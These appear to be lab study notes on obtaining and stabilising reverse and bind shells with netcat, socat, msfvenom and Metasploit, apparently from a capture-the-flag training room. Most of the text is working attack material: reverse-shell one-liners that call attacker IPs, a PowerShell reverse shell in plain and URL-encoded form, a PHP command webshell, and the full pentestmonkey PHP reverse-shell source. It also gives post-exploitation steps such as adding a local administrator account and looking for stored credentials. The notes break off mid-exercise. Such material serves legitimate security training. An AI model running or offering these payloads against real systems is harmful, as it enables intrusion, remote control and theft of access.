# What the Shell

### **What the Shell?** <a href="#gcm6knwfyrrv" id="gcm6knwfyrrv"></a>

### **What is a shell?** <a href="#cv3dujhfbq99" id="cv3dujhfbq99"></a>

* Shells are used when interfacing with a Command Line environment (CLI).
  * E.g. bash, sh, cmd.exe, Powershell.
* May be possible to force application running on remote server to execute arbitrary code.
  * Use this initial access to obtain a shell.
    * **Reverse shell** sends command line access to the remote server.
    * **Bind shell** opens up a port on the remote server to connect to and execute further commands.

### **Tools** <a href="#id-6yqrizcdnzxx" id="id-6yqrizcdnzxx"></a>

* Need malicious shellcode and a way of interfacing with the resulting shell.
* Repositories of shells are available.
  * [Payloads all the Things](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
  * PentestMonkey[ Reverse Shell Cheatsheet](https://web.archive.org/web/20200901140719/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
* Kali Linux comes pre-installed with a variety of webshells located at /usr/share/webshells.
* [SecLists repo](https://github.com/danielmiessler/SecLists) contains very useful code for obtaining shells.

#### **Netcat** <a href="#id-8a0x885hlw5i" id="id-8a0x885hlw5i"></a>

* 'Swiss Army Knife' of networking.
* Receive reverse shells.
* Connect to remote ports attached to bind shells on a target system.
* Netcat shells are very unstable (easy to lose) by default.

#### **Socat** <a href="#tgq4754v6m78" id="tgq4754v6m78"></a>

* Netcat on steroids.
* Shells are usually more stable than netcat shells.
* Syntax is more difficult.
* Very rarely installed by default.
* Socat and Netcat have .exe versions for use on Windows.

#### **Metasploit -- multi/handler** <a href="#dggn3lmr4syc" id="dggn3lmr4syc"></a>

* exploit/multi/handler module of Metasploit framework is used to receive reverse shells.
* Provides fully-fledged way to obtain stable shells.
* Only way to interact with meterpreter shell.
* Easiest way to handle staged payloads.

#### **Msfvenom** <a href="#gjknh8vkhwjl" id="gjknh8vkhwjl"></a>

* Technically part of the Metasploit Framework.
* Shipped as a standalone tool.
* Used to generate reverse and bind shell payloads on the fly.

### **Types of Shell** <a href="#id-1ovvboduz4vx" id="id-1ovvboduz4vx"></a>

#### **Reverse shells** <a href="#mrv8rdm6qfm2" id="mrv8rdm6qfm2"></a>

* Target is forced to execute code that connects back to the attacker.
* Attacker sets up listener used to receive the connection.
* Good way to bypass firewall rules that may prevent connecting to arbitrary ports on the target.
  * Attacker needs to configure their own network to accept shell when receiving a shell from a machine across the internet.
* Generally easier to execute and debug.

**Reverse Shell Example**

* Set up listener on the attack host.

sudo nc -lvnp 443

listening on \[any] 443 ...

* Send reverse shell from the target.
  * Likely done through code injection.

nc 10.11.12.223 443 -e /bin/bash

* Listener receives connection.

connect to \[10.11.22.223] from (UNKNOWN) \[10.10.199.58] 43286

* Commands run over the shell are executed as the target user.

whoami

shell

#### **Bind shells** <a href="#cju6k89eloa6" id="cju6k89eloa6"></a>

* Code is executed to start a listener attached to a shell on the target.
* This would then be opened up to the Internet.
* Attacker connects to the port that the code has opened and obtain remote code execution.
* Does not require any configuration on the attacker's network.
* May be prevented by firewalls protecting the target.
* Less common than reverse shells.

**Bind Shell Example**

* Start listener on Windows target and tell it to execute cmd.exe.

evil-winrm -i 10.10.2.57 -u Administrator -p 'TryH4ckM3!'

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

\*Evil-WinRM\* PS C:\Users\Administrator\Documents> nc -lvnp 8080 -r "cmd.exe"

nc.exe : Listening on \[any] 8080 ...

\+ CategoryInfo : NotSpecified: (listening on \[any] 8080 ...:String) \[], RemoteException

\+ FullyQualifiedErrorId : NativeCommandError

connect to \[10.10.2.57] from (UNKNOWN) \[10.12.12.223] 57336

* Connect to newly opened port (listener) from attack host.
  * Gives code execution on target host.

nc 10.10.2.57 8080

Microsoft Windows \[Version 10.0.17763.737]

(c) 2018 Microsoft Corporation. All rights reserved.

whoami

win-shells\administrator

### **Shell Interactivity** <a href="#ntk1zsgvoqy4" id="ntk1zsgvoqy4"></a>

#### **Interactive** <a href="#nrp0zavtbvno" id="nrp0zavtbvno"></a>

* Powershell, Bash, Zsh, sh, or any other standard CLI environment.
* Allows interaction with programs after executing shell.

#### **Non-Interactive** <a href="#mo0ie0bvf7cg" id="mo0ie0bvf7cg"></a>

* Limited to using programs that do not require user interaction to run properly.
* Majority of simple reverse and bind shells.
  * E.g. try to run SSH in a non-interactive shell.

sudo rlwrap nc -lvnp 443

connect to \[127.0.0.1] from (UNKNOWN) \[127.0.0.1] 37104

* whoami (non-interactive) executes perfectly.

whoami

muri

* ssh (interactive) gives no output at all.

ssh muri@localhost

* Interactive programs do not work in non-interactive shells.

### **Netcat** <a href="#ux5udxjwcar3" id="ux5udxjwcar3"></a>

#### **Reverse Shells** <a href="#srnos3o8t7dy" id="srnos3o8t7dy"></a>

* Syntax for starting listener using Linux.

nc -lvnp \<port-number>

* **-l** this will be a listener.
* **-v** request a verbose output.
* **-n** do not to resolve host names or use DNS.
* **-p** port specification will follow.
* Use any port you as long as there is not already a service using it.
  * Use sudo when starting the listener if a port below 1024 is chosen.
  * Use well-known port number (80, 443 or 53) as this is more likely to get past outbound firewall rules on the target.
* Can then connect back to listener with any number of payloads.

#### **Bind Shells** <a href="#d5yhjkpswjvj" id="d5yhjkpswjvj"></a>

* Can assume that there is already a listener waiting on a chosen port of target host.

nc \<target-ip> \<chosen-port>

* Netcat will make outbound connection to target host on chosen port.

#### **Netcat Shell Stabilisation** <a href="#bsfamf6yy1qp" id="bsfamf6yy1qp"></a>

* Netcat shells very unstable by default.
* Ctrl+C kills shell.
* Non-interactive and often have strange formatting errors.
  * Due to netcat 'shells' really being processes running inside a terminal.

**Technique 1: Python**

* Applicable to Linux boxes as they will nearly always have Python installed by default.
* Spawn better featured bash shell.
* Some targets may need the version of Python specified.
  * Replace python with python2 or python3.

python -c 'import pty;pty.spawn("/bin/bash")'

* Shell will look a bit prettier.
* Still will not be able to use tab autocomplete or the arrow keys.
* Ctrl+C will still kill shell.

export TERM=xterm

* Gives access to term commands such as clear.
* Background shell using Ctrl+Z.

^Z

\[1]+ Stopped sudo nc -lvnp 443

stty raw -echo; fg

sudo nc -lvnp 443

* Turns off terminal echo and gives access to tab autocompletes, the arrow keys, and Ctrl+C to kill processes.
* Foreground the shell to complete process.
* If the shell dies any input in the terminal will not be visible as a result of having disabled terminal echo.
  * Type reset and press enter to fix this.

^C

ssh shell@localhost

The authenticity of host 'localhost (::1)' can't be established.

\[snip ...]

**Technique 2: rlwrap**

* Gives access to history, tab autocompletion and the arrow keys immediately upon receiving a shell.
* Manual stabilisation is required to be able to use Ctrl+C inside the shell.
* rlwrap is not installed by default on Kali.
  * Install it with sudo apt install rlwrap.
* Invoke slightly different listener.

rlwrap nc -lvnp \<port>

* Prepending netcat listener with rlwrap gives much more fully featured shell.
* Particularly useful when stabilising Windows shells.
* Possible to completely stabilise a Linix shell using the same trick as in step three of previous technique.
  * Background shell with Ctrl+Z.
  * stty raw -echo; fg to stabilise and re-enter the shell.

**Technique 3: Socat**

* Use initial netcat shell as stepping stone into more fully-featured socat shell.
* Limited to Linux targets.
  * Socat shell on Windows will be no more stable than a netcat shell.
* Transfer[ socat static compiled binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/socat?raw=true) (a version of the program compiled to have no dependencies) up to target host.
  * Use webserver on the attack host inside the directory containing the socat binary.

sudo python3 -m http.server 80

* Use netcat shell to download file on target host.

wget \<LOCAL-IP>/socat -O /tmp/socat).

* In a Windows environment the same can be done with Powershell.

Invoke-WebRequest -uri ATTACKER\_IP/socat.exe -outfile C:\\\Windows\temp\socat.exe)

* Useful to be able to change terminal tty size.
  * Must be done manually in reverse or bind shell.
  * Open another terminal and run stty -a.
    * Note down values for rows and columns.
  * stty rows \<number> and stty cols \<number> in reverse/bind shell.
    * Changes registered width and height of terminal.
    * Allows programs such as text editors that rely on such information being accurate to correctly open.

### **Socat** <a href="#ipvmasgoj7hj" id="ipvmasgoj7hj"></a>

* Connector between two points.
  * E.g. listening port and the keyboard.
  * E.g. listening port and a file, or two listening ports.

#### **Reverse Shells** <a href="#id-6dzhcw222uns" id="id-6dzhcw222uns"></a>

* Basic reverse shell listener syntax.

socat TCP-L:\<port> -

* Takes two points (a listening port, and standard input) and connects them together.
* Resulting shell is unstable and is equivalent to nc -lvnp \<port>.
* Syntax for Windows target host to connect back to listener.

socat TCP:\<LOCAL-IP>:\<LOCAL-PORT> EXEC:powershell.exe,pipes

* 'pipes' is used to force powershell (or cmd.exe) to use Unix style standard input and output.
* Syntax for Linux target host to connect back to listener.

socat TCP:\<LOCAL-IP>:\<LOCAL-PORT> EXEC:"bash -li"

#### **Bind Shells** <a href="#b6amy73syiaj" id="b6amy73syiaj"></a>

* Syntax to create listener on Linux target host.

socat TCP-L:\<PORT> EXEC:"bash -li"

* Syntax to create listener on Windows target host.

socat TCP-L:\<PORT> EXEC:powershell.exe,pipes

* 'pipes' used to interface between the Unix and Windows ways of handling input and output in a CLI environment.
* Connect to waiting listener from the attack host.

socat TCP:\<TARGET-IP>:\<TARGET-PORT> -

* Socat can create fully stable Linux tty reverse shell.

socat TCP-L:\<port> FILE:\`tty\`,raw,echo=0

* Socat connects a listening port and a file.
  * Passing in the current TTY as a file and setting the echo to be zero.
  * Equivalent to using the Ctrl+Z, stty raw -echo; fg trick with a netcat shell.
* First listener can be connected to with any payload.
* Special listener must be activated with a very specific socat command.
  * Most hosts do not have socat installed by default.
  * Upload precompiled socat binary that can then be executed as normal.

socat TCP:\<attacker-ip>:\<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane

* Create an interactive bash session.

EXEC:"bash -li".

* Pass arguments.

pty, stderr, sigint, setsid and sane:

* pty allocates a pseudoterminal on the target.
  * Part of the stabilisation process.
* stderr makes sure that any error messages get shown in the shell.
  * Often a problem with non-interactive shells.
* sigint passes any Ctrl+C commands through into the sub-process allowing commands to be killed inside the shell.
* setsid creates the process in a new session.
* sane stabilises the terminal attempting to 'normalise' it.

#### **Socat Encrypted Shells** <a href="#jn829fsmxjg" id="jn829fsmxjg"></a>

* Any TCP commands replaced with OPENSSL.
* Generate certificate on attack host to use encrypted shells.
  * 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year.

openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt

* Merge the two created files into a single .pem file.

cat shell.key shell.crt > shell.pem

* Set up reverse shell listener on attack host.
  * Creates OPENSSL listener using the generated certificate.
  * verify=0 tells connection not to bother validating that the certificate has been properly signed by a recognised authority.

socat OPENSSL-LISTEN:\<PORT>,cert=shell.pem,verify=0 -

* Syntax to connect back from target host.

socat OPENSSL:\<LOCAL-IP>:\<LOCAL-PORT>,verify=0 EXEC:/bin/bash

* For a bind shell.
* Create listener on target host.

socat OPENSSL-LISTEN:\<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

* Syntax for setting up OPENSSL-LISTENER using tty technique.
  * Use port 53 and a PEM file called "encrypt.pem"

socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:\`tty\`,raw,echo=0

* Connect from attack host.

socat OPENSSL:\<TARGET-IP>:\<TARGET-PORT>,verify=0 -

* Syntax to use to connect back to tty listener if attack host IP is 10.10.10.5.

socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,san

* Certificate must be used with listener even for a Windows target host.
  * Copying PEM file across for bind shell is required.
* Technique will work with special Linux-only TTY shell covered previously.

### **Common Shell Payloads** <a href="#jilsithmo0rx" id="jilsithmo0rx"></a>

* Some versions of netcat include -e option.
  * nc.exe Windows version included with Kali at /usr/share/windows-resources/binaries.
  * netcat-traditional version used in Kali.
* Allows execution of a process on connection.
* Create bind shell listener on target host for attack host to connect to.
  * Not included in most versions of netcat as widely seen to be very insecure.

nc -lvnp \<PORT> -e /bin/bash

* Send reverse shell to listener on attack host.

nc \<LOCAL-IP> \<PORT> -e /bin/bash

* Technique will work perfectly on Windows where static binaries are nearly always required.
* Create listener for bind shell on Linux.

mkfifo /tmp/f; nc -lvnp \<PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

The command first creates a[ named pipe](https://www.linuxjournal.com/article/2156) at /tmp/f. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener (i.e. the commands we send) then gets piped directly into sh, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

* Send a netcat reverse shell.

mkfifo /tmp/f; nc \<LOCAL-IP> \<PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f

* Very common to require Powershell reverse shell when targeting modern Windows Server target hosts.
* Command is very convoluted but is extremely useful one-liner to keep on hand.

powershell -c "$client = New-Object System.Net.Sockets.TCPClient('\<ip>',\<port>);$stream = $client.GetStream();\[byte\[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = (\[text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

* Replace \<IP> and \<port> with appropriate IP and choice of port.
* Can be copied into cmd.exe shell or another method of executing commands on a Windows server and executed resulting in a reverse shell:
* [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) is a repository containing a wide range of shell codes in many different languages.

### **Msfvenom** <a href="#gofm6sc1z4wf" id="gofm6sc1z4wf"></a>

* Part of the Metasploit framework.
* Used to generate code for primarily reverse and bind shells.
* Can be used to generate payloads in various formats.
  * .exe, .aspx, .war, .py.

msfvenom -p \<PAYLOAD> \<OPTIONS>

* Generate Windows x64 Reverse Shell in an exe format.

msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=\<listen-IP> LPORT=\<listen-port>

* \-f \<format> specifies the output format.
* \-o \<file> specifies output location and filename for the generated payload.
* LHOST=\<IP> specifies IP to connect back to.
* LPORT=\<port>specifies port on the local machine to connect back to.
  * This can be anything between 0 and 65535 that is not already in use.
  * Ports below 1024 are restricted and require a listener running with root privileges.

msfvenom -p windows/x64/shell/reverse\_tcp -f exe -o shell.exe LHOST=10.11.12.223 LPORT=443

\[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload

\[-] No arch selected, selecting arch: x64 from the payload

No encoder specified, outputting raw payload

Payload size: 510 bytes

Final size of exe file: 7168 bytes

Saved as: shell.exe

### **Staged vs Stageless Payloads** <a href="#jwaeuh2h6weo" id="jwaeuh2h6weo"></a>

#### **Staged** <a href="#id-8ha3sxpn82pu" id="id-8ha3sxpn82pu"></a>

* Payloads are sent in two parts.
* First part is called the _stager_.
  * Piece of code executed directly on the server itself.
    * Connects to waiting listener and uses the connection to load the real payload.
      * Real payload is executed directly.
      * Prevents payload from touching the disk where it could be caught by traditional anti-virus solutions.
* Payload is split into two parts.
  * Small initial stager.
  * Bulkier reverse shell code that is downloaded when stager is activated.
* Requires a special listener.
  * Usually Metasploit multi/handler.
* Harder to use than stageless.
* Initial stager is a lot shorter.
* Is sometimes missed by less-effective antivirus software.
* Modern day antivirus solutions will make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager.
  * Makes staged payloads less effective than they would once have been in this area.

#### **Stageless** <a href="#o1eswmiqvqt5" id="o1eswmiqvqt5"></a>

* More common than staged.
* Entirely self-contained.
  * One piece of code that sends a shell back immediately to the waiting listener when executed.
* Tend to be easier to use and catch than staged.
* Bulkier than staged.
* Easier for an antivirus or intrusion detection program to discover and remove.

### **Meterpreter Shell** <a href="#t0uw09rlgma" id="t0uw09rlgma"></a>

* Metasploit's own brand of fully-featured shell.
* Completely stable.
  * Very good when working with Windows target hosts.
* Inbuilt functionality such as file uploads and downloads.
* Use meterpreter shell to use any of Metasploit's post-exploitation tools.
* Must be caught in Metasploit.

### **Payload Naming Conventions** <a href="#id-3hqsnqrzbl2k" id="id-3hqsnqrzbl2k"></a>

* Basic msfvenom naming convention is \<OS>/\<arch>/\<payload>.
  * E.g. linux/x86/shell\_reverse\_tcp.
  * This would generate stageless reverse shell for x86 Linux target host.
* Exception is Windows 32bit targets where arch is not specified.
  * E.g. windows/shell\_reverse\_tcp.
  * Arch specified as normal For 64bit Windows target host.
* Stageless payloads denoted with underscores \_.
* Staged payloads denoted with another forward slash /.
* Rule also applies to Meterpreter payloads.
* msfvenom --list payloads lists all available payloads.
  * Can then be piped into grep to search for specific set of payloads.

### **Metasploit multi/handler** <a href="#m4051wemuai3" id="m4051wemuai3"></a>

* Superb tool for catching reverse shells.

1. Open Metasploit with msfconsole
2. use multi/handler.
3. Press enter.

* Now primed to start a multi/handler session.
* options to look at available options.
  * Identical to options set when generating shellcode with Msfvenom.
  * **PAYLOAD** a payload specific to the target.
    * set PAYLOAD \<payload>
  * **LHOST** a listening IP address.
    * set LHOST \<listen-address>
    * LHOST must be specified as metasploit will not listen on all network interfaces like netcat or socat will.
  * **LPORT** a port with which to receive a shell.
    * set LPORT \<listen-port>
* exploit -j starts listener as a job in the background.
* Must be run with sudo permissions to listen on a port under 1024.

msf6 exploit(multi/handler) >

\[+] Sending stage (336 bytes) to 10.10.2.57

* Metasploit catches connection.
* Remainder of payload is sent to target host.

\[+] Command shell session 1 opened (10.11.12.223:443 -> 10.10.2.57:54226) at 2020-09-12 21:18:35 +0100

* multi/handler originally backgrounded.
* Use sessions 1 to foreground session again.

msf6 exploit(multi-handler) > session 1

\[+] Starting interation with 1...

* Reverse shell established.

whoami

win-shells\administrator

* Use sessions to see all active sessions.
* Use sessions \<number> to select appropriate session to foreground.

### **WebShells** <a href="#ffmiv4x83lep" id="ffmiv4x83lep"></a>

* May encounter websites that allow upload of executable files.
  * Ideally use this opportunity to upload code that would activate a reverse or bind shell.
  * Sometimes this is not possible.
  * Instead upload a webshell.
* Script that runs inside a web server (usually in a language such as PHP or ASP) and executes code on remote server.
* Commands entered into the webpage.
  * E.g. through a HTML form or directly as arguments in the URL.
* Commands executed by webshell script with results returned and written to the page.
* Can be extremely useful if there are firewalls in place.
* Stepping stone into a fully fledged reverse or bind shell.

\<?php

// Take GET parameter in the URL and execute it with shell\_exec()

echo "\<pre>" . shell\_exec($\_GET\["cmd"]) . "\</pre>";

?>

* Any commands entered in the URL after ?cmd= will be executed on the system.
* 'pre' elements are to ensure that the results are formatted correctly on the page.
* Use a GET parameter 'cmd' with the command 'ifconfig' to return the network information of the box.

http://10.10.84.199/uploads/shell.php?cmd=ifconfig

* Entering ifconfig (used to check the network interfaces on a Linux target) into the URL executed the command on the system and returned the results.
  * This would work for any other command (whoami, hostname, arch, etc).
* Variety of webshells available on Kali by default at /usr/share/webshells.
  * includes the infamous[ PentestMonkey php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

\<?php

// php-reverse-shell - A Reverse Shell implementation in PHP

// Copyright (C) 2007 pentestmonkey@pentestmonkey.net

//

// This tool may be used for legal purposes only. Users take full responsibility

// for any actions performed using this tool. The author accepts no liability

// for damage caused by this tool. If these terms are not acceptable to you, then

// do not use this tool.

//

// In all other respects the GPL version 2 applies:

//

// This program is free software; you can redistribute it and/or modify

// it under the terms of the GNU General Public License version 2 as

// published by the Free Software Foundation.

//

// This program is distributed in the hope that it will be useful,

// but WITHOUT ANY WARRANTY; without even the implied warranty of

// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the

// GNU General Public License for more details.

//

// You should have received a copy of the GNU General Public License along

// with this program; if not, write to the Free Software Foundation, Inc.,

// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

//

// This tool may be used for legal purposes only. Users take full responsibility

// for any actions performed using this tool. If these terms are not acceptable to

// you, then do not use this tool.

//

// You are encouraged to send comments, improvements or suggestions to

// me at pentestmonkey@pentestmonkey.net

//

// Description

// -----------

// This script will make an outbound TCP connection to a hardcoded IP and port.

// The recipient will be given a shell running as the current user (apache normally).

//

// Limitations

// -----------

// proc\_open and stream\_set\_blocking require PHP version 4.3+, or 5+

// Use of stream\_select() on file descriptors returned by proc\_open() will fail and return FALSE under Windows.

// Some compile-time options are needed for daemonisation (like pcntl, posix). These are rarely available.

//

// Usage

// -----

// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set\_time\_limit (0);

$VERSION = "1.0";

$ip = 'PUT\_THM\_ATTACKBOX\_IP\_HERE'; // CHANGE THIS

$port = 1234; // CHANGE THIS

$chunk\_size = 1400;

$write\_a = null;

$error\_a = null;

$shell = 'uname -a; w; id; /bin/sh -i';

$daemon = 0;

$debug = 0;

//

// Daemonise ourself if possible to avoid zombies later

//

// pcntl\_fork is hardly ever available, but will allow us to daemonise

// our php process and avoid zombies. Worth a try...

if (function\_exists('pcntl\_fork')) {

// Fork and have the parent process exit

$pid = pcntl\_fork();

if ($pid == -1) {

printit("ERROR: Can't fork");

exit(1);

}

if ($pid) {

exit(0); // Parent exits

}

// Make the current process a session leader

// Will only succeed if we forked

if (posix\_setsid() == -1) {

printit("Error: Can't setsid()");

exit(1);

}

$daemon = 1;

} else {

printit("WARNING: Failed to daemonise. This is quite common and not fatal.");

}

// Change to a safe directory

chdir("/");

// Remove any umask we inherited

umask(0);

//

// Do the reverse shell...

//

// Open reverse connection

$sock = fsockopen($ip, $port, $errno, $errstr, 30);

if (!$sock) {

printit("$errstr ($errno)");

exit(1);

}

// Spawn shell process

$descriptorspec = array(

0 => array("pipe", "r"), // stdin is a pipe that the child will read from

1 => array("pipe", "w"), // stdout is a pipe that the child will write to

2 => array("pipe", "w") // stderr is a pipe that the child will write to

);

$process = proc\_open($shell, $descriptorspec, $pipes);

if (!is\_resource($process)) {

printit("ERROR: Can't spawn shell");

exit(1);

}

// Set everything to non-blocking

// Reason: Occsionally reads will block, even though stream\_select tells us they won't

stream\_set\_blocking($pipes\[0], 0);

stream\_set\_blocking($pipes\[1], 0);

stream\_set\_blocking($pipes\[2], 0);

stream\_set\_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {

// Check for end of TCP connection

if (feof($sock)) {

printit("ERROR: Shell connection terminated");

break;

}

// Check for end of STDOUT

if (feof($pipes\[1])) {

printit("ERROR: Shell process terminated");

break;

}

// Wait until a command is end down $sock, or some

// command output is available on STDOUT or STDERR

$read\_a = array($sock, $pipes\[1], $pipes\[2]);

$num\_changed\_sockets = stream\_select($read\_a, $write\_a, $error\_a, null);

// If we can read from the TCP socket, send

// data to process's STDIN

if (in\_array($sock, $read\_a)) {

if ($debug) printit("SOCK READ");

$input = fread($sock, $chunk\_size);

if ($debug) printit("SOCK: $input");

fwrite($pipes\[0], $input);

}

// If we can read from the process's STDOUT

// send data down tcp connection

if (in\_array($pipes\[1], $read\_a)) {

if ($debug) printit("STDOUT READ");

$input = fread($pipes\[1], $chunk\_size);

if ($debug) printit("STDOUT: $input");

fwrite($sock, $input);

}

// If we can read from the process's STDERR

// send data down tcp connection

if (in\_array($pipes\[2], $read\_a)) {

if ($debug) printit("STDERR READ");

$input = fread($pipes\[2], $chunk\_size);

if ($debug) printit("STDERR: $input");

fwrite($sock, $input);

}

}

fclose($sock);

fclose($pipes\[0]);

fclose($pipes\[1]);

fclose($pipes\[2]);

proc\_close($process);

// Like print, but does nothing if we've daemonised ourself

// (I can't figure out how to redirect STDOUT like a proper daemon)

function printit ($string) {

if (!$daemon) {

print "$string\n";

}

}

?>

* Most language specific (e.g. PHP) reverse shells are written for Unix based targets such as Linux webservers.
  * They will not work on Windows by default.
* Obtain RCE on Windows stargets.
  * Use msfvenom to generate reverse/bind shell in the language of the server.
  * Use a web shell on Windows targets.
    * Obtaining RCE is often done with a URL Encoded Powershell Reverse Shell copied into the URL as the cmd argument.

powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27\<IP>%27%2C\<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22

* Same shell encountered above in the "Common Shell Payloads" section.
  * Has been URL encoded to be used safely in a GET parameter.
  * IP and Port will still need to be changed.

### **Next Steps** <a href="#id-7ntdp9ele5q7" id="id-7ntdp9ele5q7"></a>

* Shells tend to be unstable and non-interactive.
* Look for opportunities to gain access to a user account on Linux.
  * SSH keys stored at /home/\<user>/.ssh are often an ideal way to do this.
  * Some exploits will also allow addition of a new account.
  * [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give SSH access to the machine.
* Options are more limited on Windows.
  * Sometimes possible to find passwords for running services in the registry.
    * VNC servers frequently leave passwords in the registry stored in plaintext.
  * Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml or C:\xampp\FileZilla Server\FileZilla Server.xml.
    * These can be MD5 hashes or in plaintext depending on the version.
  * Ideally want to obtain a shell running as the SYSTEM user or an administrator account running with high privileges.
    * Possible to add an account (in the administrators group) to the machine.

net user \<username> \<password> /add

net localgroup administrators \<username> /add

\* Log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods dependent on the services running on the box.

### **Important takeaway** <a href="#id-5ri2etpumaip" id="id-5ri2etpumaip"></a>

* Reverse and Bind shells are essential techniques for gaining remote code execution on a target host.
* They will never be as fully featured as a native shell.
* Always try to escalate into using a 'normal' method for accessing the machine as this will invariably be easier to use for further exploitation of the target.

### **Practice and Examples** <a href="#qpsn1trdc9hr" id="qpsn1trdc9hr"></a>

Try uploading a webshell to the Linux box, then use the command: nc \<LOCAL-IP> \<PORT> -e /bin/bash to send a reverse shell back to a waiting listener on the attaching machine.

1. Navigate to /usr/share/webshells/php/php-reverse-shell.php.
2. Make a copy of the supplied webshell on the attacking machine’s Desktop.

cp /usr/share/webshells/php/php-reverse-shell.php ./Desktop

1. Change the IP and port of the webshell to match the attacking machine’s IP with a custom port.

* vim ./Desktop/php-reverse-shell.php.
* Press i to enter insert mode.
* Change ip to 10.10.52.172.
* Press Escape to enter Command mode.
* Press :wq to save changes and exit file.

1. Set up a netcat listener on the attack machine.

nc -lvnp 1234

1. Upload webshell to target.

* Browse to http://10.10.62.10 from attacking machine.
* Click ‘Browse’ button.
* Navigate to /root/Desktop/php-reverse-shell.php.
* Click ‘Open’ to select the file.
* Click ‘Submit’ to upload the file.

1. Execute webshell on target.

* Amend URL to http://10.10.62.10/uploads/php-reverse-shell.php?cmd=nc 10.10.52.172 1234 -e /bin/bash.
* Reverse shell creates session back to listener.

Connection from 10.10.62.10 34914 received!

Linux linux-shell-practice 4.15.0-117-generic #118-Ubuntu SMP Fri Sep 4 20:02:41 UTC 2020 x86\_64 x86\_64 x86\_64 GNU/Linux

20:28:01 up 10 min, 0 users, load average: 0.00, 0.20, 0.25

USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT

uid=33(www-data) gid=33(www-data) groups=33(www-data)

/bin/sh: 0 can't access tty: job control turned off

#### **Extra: stabilise the netcat shell** <a href="#siu9d6ofcho6" id="siu9d6ofcho6"></a>

python3 -c 'import pty;pty.spawn("/bin/bash")'

export TERM=xterm

* Background the shell using Ctrl+Z

stty raw -echo; fg

Log into the Linux machine over SSH using the supplied credentials. Use the techniques in the Common Shell Payloads section to experiment with bind and reverse netcat shells.

**Create reverse shell on target host and execute the bash process upon connection.**

nc 10.10.52.172 1234 -e /bin/bash

1. Create listener on attack host.

nc -lvnp 1234

Listening on \[0.0.0.0] (family 0, port 1234)

1. Connection received by attack host.

Connection from 10.10.62.10 34924 received!

pwd

/home/shell

**Create bind shell and execute the bash process upon connection.**

1. Create listener on target.

nc -lvnp 1234 -e /bin/bash

listening on \[any] 1234 ...

1. Connect to listener from attacking machine.

nc 10.10.62.10 1234

1. Connection established.

* On target.

connect to \[10.10.62.10] from (UNKNOWN) \[10.10.52.172] 50168

* On attacker.

pwd

/home/shell

**Create named pipe for bind shell.**

1. Create listener on target.

mkfifo /tmp/f; nc -lvnp 1234 < /tmp/f | /bin/sh > /tmp/f 2>&1; rm /tmp/f

listening on \[any] 1234 ...

1. Connect NetCat to listener.

nc 10.10.19.211 1234

1. Bind shell connected to named pipe method.

* On target.

connect to \[10.10.19.211] from (UNKNOWN} \[10.10.145.37] 60982

* On attacker.

whoami

shell

pwd

/home/shell

Practice reverse and bind shells using Socat on the Linux machine. Try both the normal and special techniques.

**Create reverse shell and execute the bash process upon connection.**

1. Create reverse shell on target host.

socat TCP:10.10.52.172:1234 EXEC:”bash -li”

1. Create listener on attack host.

socat TCP-L:1234 -

1. Reverse shell caught by listener.

pwd

/home/shell

**Create bind shell and execute the bash process upon connection.**

1. Create listener on target host.

socat TCP-L:12345 EXEC:”bash -li”

1. Bind to listener from attack host.

